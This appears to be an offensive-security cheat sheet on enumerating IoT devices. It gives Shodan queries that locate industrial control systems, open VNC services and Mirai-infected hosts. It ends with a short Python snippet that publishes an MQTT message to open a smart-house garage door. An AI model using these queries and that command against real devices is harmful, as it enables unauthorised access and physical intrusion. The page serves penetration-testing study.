# 📳 Enumerating IoT Devices

## IoT - Hacking

### Communication Protocols

* Message Queuing Telemetry Transport (MQTT)
* Extensible Messaging and Presence Protocol (XMPP)
* Data Distribution Service for Real-Time Systems (DDS)
* Advanced Message Queuing Protocol (AMQP)

### Shodan IoT Search Engine

#### Web Interface

* [Shodan](https://images.shodan.io)

#### Find ICS

```
category:ics -http -html -ssh -ident country:us
```

### Shodan Command-Line Interface

#### Using the Shodan Command Line

**Install Shodan**

```
sudo apt install shodan
```

**Initialize the API Key**

```
shodan init <api-key>
```

**Test for credits available in your account**

```
shodan info
```

**Scan to find VNC services (RFB), showing IP, port, org, and hostnames**

```
shodan search --fields ip_str,port,org,hostnames RFB > results.txt

wc -l results.txt
```

**Check the honeyscore**

```
shodan honeyscore <IP Address>
```

### Shodan API

#### Testing the Shodan API

**Installation**

```
pip3 install shodan
```

**mqtt-search.py**

```
python3 mqtt-search.py

wc -l mqtt-results.txt

head mqtt-results.txt
```

#### Playing with MQTT

**Install paho-mqtt**

```
pip3 install paho-mqtt
```

**mqtt-scan.py**

```
python3 mqtt-scan.py
```

#### Serious Risk

**Open Garage Door**

```
import paho.mqtt.client as mqtt
def on_connect(client, userdata, flags, rc):
   print "[+] Connection success"
client = mqtt.Client(client_id = "MqttClient")
client.on_connect = on_connect
client.connect('IP SERVER HERE', 1883, 60)
client.publish('smarthouse/garage/door', "{'open':'true'}")

```

### Mirai Lives

#### Search for Mirai Infected Devices

```
shodan search --fields ip_str,port,org,hostnames categories:mirai > results2.txt

head results2.txt
```

## Further Readings

* [Internet of Things Scanner by BullGuard](https://iotscanner.bullguard.com/)

## References

* [Pasknel](https://medium.com/@pasknel/hacking-the-iot-with-mqtt-8edaf0d07b9b)
